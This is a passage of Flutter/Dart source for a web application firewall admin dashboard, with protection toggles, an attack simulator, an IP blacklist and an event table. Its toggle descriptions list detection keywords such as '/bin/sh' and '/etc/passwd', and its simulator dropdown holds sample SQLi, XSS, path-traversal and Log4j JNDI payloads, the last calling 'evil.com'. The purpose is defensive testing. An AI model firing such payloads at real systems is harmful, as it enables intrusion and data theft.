                        value: mode == 'detection' ? 'detection' : 'enforce',
                        isDense: true,
                        items: const [
                          DropdownMenuItem(value: 'enforce', child: Text('Enforcing (Block attacks with 403 Forbidden)')),
                          DropdownMenuItem(value: 'detection', child: Text('Detection (Pass traffic & log threat headers)')),
                        ],
                        onChanged: (val) {
                          if (val != null) {
                            setState(() => _wafConfig['mode'] = val);
                          }
                        },
                      ),
                      const SizedBox(width: 24),
                      const Text('Paranoia Level: ', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
                      const SizedBox(width: 8),
                      DropdownButton<int>(
                        value: paranoia >= 1 && paranoia <= 4 ? paranoia : 1,
                        isDense: true,
                        items: const [
                          DropdownMenuItem(value: 1, child: Text('Level 1 (Recommended - Low False Positives)')),
                          DropdownMenuItem(value: 2, child: Text('Level 2 (Advanced Security)')),
                          DropdownMenuItem(value: 3, child: Text('Level 3 (Strict Corporate)')),
                          DropdownMenuItem(value: 4, child: Text('Level 4 (Paranoid / Zero-Trust)')),
                        ],
                        onChanged: (val) {
                          if (val != null) {
                            setState(() => _wafConfig['paranoia_level'] = val);
                          }
                        },
                      ),
                      const Spacer(),
                      FilledButton.icon(
                        style: FilledButton.styleFrom(backgroundColor: const Color(0xFFF97316)),
                        icon: _wafSaving
                            ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                            : const Icon(Icons.save, size: 16),
                        label: const Text('Save Threat Shield Config'),
                        onPressed: _wafSaving ? null : _saveWAFConfig,
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(height: 14),

          // 4 Security KPI Cards
          Row(
            children: [
              Expanded(child: _metricCard('Requests Evaluated', '$requestsEval', Icons.policy, Colors.blue, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Attacks Intercepted', '$blockedAttacks', Icons.gpp_bad, Colors.red, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Protected Routes', '$activeRoutes', Icons.fork_right, Colors.green, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Blacklisted IPs', '$blacklistedCount', Icons.block, Colors.purple, theme)),
            ],
          ),
          const SizedBox(height: 14),

          // Threat Vectors & IP Blacklist Row
          Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Attack Vector Toggles
              Expanded(
                flex: 3,
                child: Card(
                  child: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            const Icon(Icons.tune, size: 20, color: Color(0xFFF97316)),
                            const SizedBox(width: 8),
                            Text('Core Protection Vectors (OWASP Top 10)', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                          ],
                        ),
                        const SizedBox(height: 14),
                        _wafVectorTile(
                          'SQL Injection (SQLi)',
                          'Blocks UNION SELECT, sleep, benchmark, information_schema, SQL comment injection',
                          blockSQLi,
                          (v) => setState(() => _wafConfig['block_sqli'] = v),
                        ),
                        _wafVectorTile(
                          'Cross-Site Scripting (XSS)',
                          'Blocks <script>, javascript: URI, onerror, document.cookie, malicious HTML tags',
                          blockXSS,
                          (v) => setState(() => _wafConfig['block_xss'] = v),
                        ),
                        _wafVectorTile(
                          'Remote Code Execution (RCE & Log4j)',
                          'Blocks \${jndi:ldap}, /bin/sh, /bin/bash, powershell, cmd.exe, wget/curl payload injection',
                          blockRCE,
                          (v) => setState(() => _wafConfig['block_rce'] = v),
                        ),
                        _wafVectorTile(
                          'Path Traversal & LFI / RFI',
                          'Blocks directory traversal (../, ..\\), /etc/passwd, /proc/self, win.ini, boot.ini',
                          blockLFI,
                          (v) => setState(() => _wafConfig['block_lfi'] = v),
                        ),
                        _wafVectorTile(
                          'Malicious Scanners & Bot Probes',
                          'Detects & terminates sqlmap, nikto, w3af, masscan, nmap, gobuster, dirbuster, wpscan',
                          blockScanners,
                          (v) => setState(() => _wafConfig['block_scanners'] = v),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 14),

              // Interactive Penetration Test & Simulator
              Expanded(
                flex: 2,
                child: Card(
                  child: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            const Icon(Icons.science, size: 20, color: Color(0xFFF97316)),
                            const SizedBox(width: 8),
                            Text('Threat Shield Attack Simulator', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                          ],
                        ),
                        const SizedBox(height: 8),
                        Text(
                          'Simulate live attack probes against any ingress route to verify Threat Shield interception.',
                          style: theme.textTheme.bodySmall?.copyWith(color: theme.colorScheme.onSurface.withValues(alpha: 0.6)),
                        ),
                        const SizedBox(height: 14),
                        const Text('Target Route:', style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 4),
                        TextField(
                          decoration: InputDecoration(
                            hintText: _routesList.isNotEmpty ? _routesList.first['host'] ?? 'app.gbnt.local' : 'app.gbnt.local',
                            prefixIcon: const Icon(Icons.link, size: 18),
                            isDense: true,
                          ),
                          onChanged: (val) => _wafSimulateHost = val.trim(),
                        ),
                        const SizedBox(height: 12),
                        const Text('Attack Vector to Simulate:', style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 4),
                        DropdownButtonFormField<String>(
                          value: _wafSimulateVector,
                          decoration: const InputDecoration(isDense: true),
                          items: const [
                            DropdownMenuItem(value: 'SQLI', child: Text('SQLi: ?id=1+UNION+SELECT+1,2,3--')),
                            DropdownMenuItem(value: 'XSS', child: Text('XSS: ?q=<script>alert(1)</script>')),
                            DropdownMenuItem(value: 'RCE', child: Text('RCE: ?cmd=\${jndi:ldap://evil.com}')),
                            DropdownMenuItem(value: 'LFI', child: Text('LFI: ?file=../../../../etc/passwd')),
                            DropdownMenuItem(value: 'SCANNER', child: Text('SCANNER: User-Agent: sqlmap/1.8')),
                          ],
                          onChanged: (val) {
                            if (val != null) setState(() => _wafSimulateVector = val);
                          },
                        ),
                        const SizedBox(height: 16),
                        SizedBox(
                          width: double.infinity,
                          child: FilledButton.icon(
                            style: FilledButton.styleFrom(backgroundColor: const Color(0xFFF97316)),
                            icon: const Icon(Icons.bolt, size: 18),
                            label: const Text('Launch Attack Probe'),
                            onPressed: _runWAFSimulation,
                          ),
                        ),
                        const SizedBox(height: 16),
                        // IP Blacklist Quick Action
                        const Divider(),
                        Row(
                          children: [
                            const Icon(Icons.block, size: 18, color: Colors.purple),
                            const SizedBox(width: 8),
                            const Text('Threat Shield Blacklist', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
                            const Spacer(),
                            IconButton(
                              icon: const Icon(Icons.add_circle, size: 20, color: Color(0xFFF97316)),
                              tooltip: 'Add IP to Blacklist',
                              onPressed: _showAddBlacklistIPDialog,
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        if (blacklistedIPs.isEmpty)
                          const Text('No IPs blacklisted.', style: TextStyle(fontSize: 12, color: Colors.grey))
                        else
                          Wrap(
                            spacing: 8,
                            runSpacing: 6,
                            children: blacklistedIPs.map((ip) {
                              return Chip(
                                label: Text(ip, style: const TextStyle(fontSize: 11, fontFamily: 'Courier New')),
                                deleteIcon: const Icon(Icons.close, size: 14),
                                onDeleted: () async {
                                  await ApiService.unblockWAFIP(ip);
                                  _showSnackBar('IP $ip removed from blacklist');
                                  await _loadCaddyData();
                                },
                              );
                            }).toList(),
                          ),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 14),

          // Intercepted Security Events Stream Card
          Card(
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      const Icon(Icons.receipt_long, size: 20, color: Color(0xFFF97316)),
                      const SizedBox(width: 8),
                      Text('Intercepted Threat Events & SIEM Audit Stream', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                      const Spacer(),
                      const Text('Filter: ', style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
                      const SizedBox(width: 6),
                      DropdownButton<String>(
                        value: _wafEventFilter,
                        isDense: true,
                        items: const [
                          DropdownMenuItem(value: 'ALL', child: Text('All Attacks')),
                          DropdownMenuItem(value: 'SQLI', child: Text('SQL Injection')),
                          DropdownMenuItem(value: 'XSS', child: Text('XSS')),
                          DropdownMenuItem(value: 'RCE', child: Text('RCE')),
                          DropdownMenuItem(value: 'LFI', child: Text('LFI / Traversal')),
                          DropdownMenuItem(value: 'SCANNER', child: Text('Scanners / Bots')),
                          DropdownMenuItem(value: 'IP_BLOCK', child: Text('IP Blocks')),
                        ],
                        onChanged: (val) {
                          if (val != null) {
                            setState(() => _wafEventFilter = val);
                            _loadCaddyData();
                          }
                        },
                      ),
                      const SizedBox(width: 12),
                      IconButton(
                        icon: const Icon(Icons.refresh, size: 18),
                        tooltip: 'Refresh event stream',
                        onPressed: _loadCaddyData,
                      ),
                    ],
                  ),
                  const SizedBox(height: 14),
                  if (_wafEvents.isEmpty)
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(24),
                      alignment: Alignment.center,
                      child: const Text('No security events recorded yet. Run an attack probe above to test!', style: TextStyle(color: Colors.grey)),
                    )
                  else
                    SingleChildScrollView(
                      scrollDirection: Axis.horizontal,
                      child: DataTable(
                        columns: const [
                          DataColumn(label: Text('TIMESTAMP')),
                          DataColumn(label: Text('CLIENT IP')),
                          DataColumn(label: Text('TARGET HOST / URI')),
                          DataColumn(label: Text('ATTACK TYPE')),
                          DataColumn(label: Text('RULE ID')),
                          DataColumn(label: Text('ACTION')),
                          DataColumn(label: Text('DETAILS')),
                        ],
                        rows: _wafEvents.map((e) {
                          final ts = (e['timestamp'] ?? '').toString().replaceAll('T', ' ').split('.').first;
                          final clientIP = e['client_ip'] ?? '-';
                          final host = e['host'] ?? '-';
                          final uri = e['uri'] ?? '/';
                          final attack = e['attack_type'] ?? '-';
                          final rule = e['rule_id'] ?? '-';
                          final action = e['action'] ?? 'BLOCKED';
                          final details = e['details'] ?? '-';

                          return DataRow(cells: [
                            DataCell(Text(ts, style: const TextStyle(fontSize: 11, fontFamily: 'Courier New'))),
                            DataCell(Text(clientIP, style: const TextStyle(fontSize: 11, fontFamily: 'Courier New'))),
                            DataCell(Text('$host$uri', style: const TextStyle(fontSize: 11, fontFamily: 'Courier New', fontWeight: FontWeight.bold))),
                            DataCell(Container(
                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: Colors.orange.withValues(alpha: 0.15),
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(color: Colors.orange.withValues(alpha: 0.4)),
                              ),
                              child: Text(attack, style: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.orange)),
                            )),
                            DataCell(Text(rule, style: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold))),
                            DataCell(Container(
                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: action == 'BLOCKED' ? Colors.red.withValues(alpha: 0.15) : Colors.amber.withValues(alpha: 0.15),
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(color: action == 'BLOCKED' ? Colors.red : Colors.amber),
                              ),
                              child: Text(action, style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: action == 'BLOCKED' ? Colors.red : Colors.amber)),
                            )),
                            DataCell(Text(details, style: const TextStyle(fontSize: 11))),
                          ]);
                        }).toList(),
                      ),
                    ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _wafVectorTile(String title, String subtitle, bool value, ValueChanged<bool> onChanged) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 12),
      child: Row(
        children: [
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: const TextStyle(fontSize: 13, fontWeight: FontWeight.bold)),
                const SizedBox(height: 2),
                Text(subtitle, style: const TextStyle(fontSize: 11, color: Colors.grey)),
              ],
            ),
          ),
          Switch(
            value: value,
            activeColor: const Color(0xFFF97316),
            onChanged: onChanged,
          ),
        ],
      ),
    );
  }

  Future<void> _saveWAFConfig() async {
    setState(() => _wafSaving = true);
    try {
      final res = await ApiService.updateWAFConfig(_wafConfig);
      _showSnackBar(res['message'] ?? 'Threat Shield configuration updated!');
      await _loadCaddyData();
    } catch (e) {
      _showSnackBar('Failed to update WAF: $e');
    } finally {
      if (mounted) setState(() => _wafSaving = false);
    }
  }

  Future<void> _runWAFSimulation() async {
    final host = _wafSimulateHost.isNotEmpty
        ? _wafSimulateHost
        : (_routesList.isNotEmpty ? _routesList.first['host'] ?? 'app.gbnt.local' : 'app.gbnt.local');
    try {
      final res = await ApiService.simulateWAFThreat(host, _wafSimulateVector);
      final evt = res['event'] ?? {};
      final action = evt['action'] ?? 'BLOCKED';
      final rule = evt['rule_id'] ?? 'WAF00X';
      _showSnackBar('🛡️ Probe result: $action by $rule (${evt['details']})');
      await _loadCaddyData();
    } catch (e) {
      _showSnackBar('Probe error: $e');
    }
  }

  void _showAddBlacklistIPDialog() {
    final ipCtrl = TextEditingController();
    final reasonCtrl = TextEditingController(text: 'Manual UI block');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Row(
          children: [
            Icon(Icons.block, color: Colors.red),
            SizedBox(width: 8),
            Text('Add IP to Threat Shield Blacklist'),
          ],
        ),
        content: SizedBox(
          width: 400,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextField(
                controller: ipCtrl,
                decoration: const InputDecoration(
                  labelText: 'IP Address or CIDR (e.g. 198.51.100.4 or 198.51.100.0/24)',
                  prefixIcon: Icon(Icons.network_check),
                  isDense: true,
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: reasonCtrl,
                decoration: const InputDecoration(
                  labelText: 'Reason for blocking',
                  prefixIcon: Icon(Icons.notes),
                  isDense: true,
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Cancel')),
          FilledButton.icon(
            style: FilledButton.styleFrom(backgroundColor: Colors.red),
            icon: const Icon(Icons.block, size: 16),
            label: const Text('Block IP'),
            onPressed: () async {
              final ip = ipCtrl.text.trim();
              final reason = reasonCtrl.text.trim();
              if (ip.isEmpty) return;
              Navigator.pop(ctx);
              await ApiService.blockWAFIP(ip, reason);
              _showSnackBar('IP $ip added to blacklist');
              await _loadCaddyData();
            },
          ),
        ],
      ),
    );
  }
}

class CaddyParsedBlock {
  final String host;
  final String cleanHost;
  final String scheme;
  final String url;
  final List<String> upstreams;
  final String tls;
  final bool wafEnabled;
  final String wafMode;
  final String lbPolicy;
  final String healthUri;
  final List<String> directives;
  final String raw;

  const CaddyParsedBlock({
    required this.host,
    required this.cleanHost,
    required this.scheme,
    required this.url,
    required this.upstreams,
    required this.tls,
    required this.wafEnabled,
    required this.wafMode,
    required this.lbPolicy,
    required this.healthUri,
    required this.directives,
    required this.raw,
  });

  Map<String, dynamic> toJson() => {
    'ingress_host': host,
    'clean_host': cleanHost,
    'scheme': scheme,
    'url': url,
    'upstreams': upstreams,
    'tls': tls,
    'waf': {
      'enabled': wafEnabled,
      'mode': wafMode,
    },
    if (lbPolicy.isNotEmpty) 'lb_policy': lbPolicy,
    if (healthUri.isNotEmpty) 'health_uri': healthUri,
    if (directives.isNotEmpty) 'other_directives': directives,
  };
}
